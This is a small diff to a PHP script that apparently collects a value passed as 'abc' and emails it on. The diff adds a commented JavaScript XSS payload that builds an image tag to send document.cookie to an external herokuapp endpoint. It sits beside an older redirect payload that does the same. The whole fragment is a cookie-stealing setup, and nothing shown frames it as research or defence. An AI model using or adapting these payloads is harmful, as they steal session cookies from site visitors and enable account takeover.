@@ -32,5 +32,6 @@ if (isset($_GET["abc"])) {
     $mail->Send();
 
 //document.location="https://yeuvephp.herokuapp.com/abc.php?abc=" + document.cookie;
+//var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );document.getElementById("top_banner").appendChild(elem);
 }
 ?>
